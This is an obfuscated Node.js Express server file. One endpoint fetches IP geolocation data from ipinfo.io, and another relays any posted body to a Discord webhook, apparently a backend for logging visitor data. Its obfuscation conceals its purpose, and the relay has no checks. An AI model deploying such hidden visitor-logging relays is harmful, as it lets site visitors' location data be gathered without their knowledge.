const _0xff5c24=_0x8ef4;(function(_0x11034a,_0x536bec){const _0x51a99b=_0x8ef4,_0x16797f=_0x11034a();while(!![]){try{const _0x207b7e=-parseInt(_0x51a99b(0x126))/0x1*(-parseInt(_0x51a99b(0x10b))/0x2)+-parseInt(_0x51a99b(0x116))/0x3+-parseInt(_0x51a99b(0x10f))/0x4+parseInt(_0x51a99b(0x120))/0x5*(parseInt(_0x51a99b(0x12b))/0x6)+-parseInt(_0x51a99b(0x124))/0x7*(-parseInt(_0x51a99b(0x10a))/0x8)+parseInt(_0x51a99b(0x122))/0x9+-parseInt(_0x51a99b(0x11f))/0xa;if(_0x207b7e===_0x536bec)break;else _0x16797f['push'](_0x16797f['shift']());}catch(_0x5360f0){_0x16797f['push'](_0x16797f['shift']());}}}(_0x5be6,0x6cc4a),require(_0xff5c24(0x117))[_0xff5c24(0x125)]());const express=require(_0xff5c24(0x113)),fetch=require(_0xff5c24(0x128)),bodyParser=require(_0xff5c24(0x110)),cors=require(_0xff5c24(0x10e)),app=express(),PORT=process[_0xff5c24(0x11d)][_0xff5c24(0x12a)]||0xbb8;function _0x8ef4(_0x316d9b,_0x1eb8f){const _0x5be608=_0x5be6();return _0x8ef4=function(_0x8ef4f4,_0x28bb24){_0x8ef4f4=_0x8ef4f4-0x108;let _0x14e61f=_0x5be608[_0x8ef4f4];return _0x14e61f;},_0x8ef4(_0x316d9b,_0x1eb8f);}function _0x5be6(){const _0x4344e9=['6190mknIOm','DISCORD_WEBHOOK_URL','5819238MFqjVZ','json','119zNSUEj','config','638272WvRHqv','status','node-fetch','error','PORT','4152ZoqlQc','log','get','Server\x20running\x20on\x20port\x20','post','8072YYHGQq','2DImpcZ','IPINFO_TOKEN','Error\x20fetching\x20information:','cors','1164304TCLCAt','body-parser','/getVisitorInfo','Error\x20sending\x20to\x20Discord','express','Error\x20sending\x20to\x20Discord:','listen','2605953CnRoik','dotenv','Discord\x20webhook\x20request\x20failed\x20with\x20status\x20','body','IPInfo\x20API\x20request\x20failed\x20with\x20status\x20','use','Error\x20fetching\x20information','env','https://ipinfo.io/json?token=','5534620dmuCEz'];_0x5be6=function(){return _0x4344e9;};return _0x5be6();}app[_0xff5c24(0x11b)](cors()),app[_0xff5c24(0x11b)](bodyParser['json']()),app[_0xff5c24(0x12d)](_0xff5c24(0x111),async(_0x45354d,_0x194f3e)=>{const _0x6ae01a=_0xff5c24;try{const _0x4cac43=await fetch(_0x6ae01a(0x11e)+process[_0x6ae01a(0x11d)][_0x6ae01a(0x10c)]);if(!_0x4cac43['ok'])throw new Error(_0x6ae01a(0x11a)+_0x4cac43[_0x6ae01a(0x127)]);const _0x335db4=await _0x4cac43[_0x6ae01a(0x123)]();_0x194f3e[_0x6ae01a(0x123)](_0x335db4);}catch(_0x4f8007){console[_0x6ae01a(0x129)](_0x6ae01a(0x10d),_0x4f8007),_0x194f3e[_0x6ae01a(0x127)](0x1f4)[_0x6ae01a(0x123)]({'error':_0x6ae01a(0x11c)});}}),app[_0xff5c24(0x109)]('/sendToDiscord',async(_0x115f3d,_0x3c84f7)=>{const _0xadf3d8=_0xff5c24;try{const _0x239688=_0x115f3d[_0xadf3d8(0x119)],_0x35ed76={'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x239688)},_0x25e3e7=await fetch(process['env'][_0xadf3d8(0x121)],_0x35ed76);if(!_0x25e3e7['ok'])throw new Error(_0xadf3d8(0x118)+_0x25e3e7[_0xadf3d8(0x127)]);_0x3c84f7[_0xadf3d8(0x123)]({'success':!![]});}catch(_0x2b46d7){console['error'](_0xadf3d8(0x114),_0x2b46d7),_0x3c84f7[_0xadf3d8(0x127)](0x1f4)[_0xadf3d8(0x123)]({'error':_0xadf3d8(0x112)});}}),app[_0xff5c24(0x115)](PORT,()=>{const _0x22d67e=_0xff5c24;console[_0x22d67e(0x12c)](_0x22d67e(0x108)+PORT);});
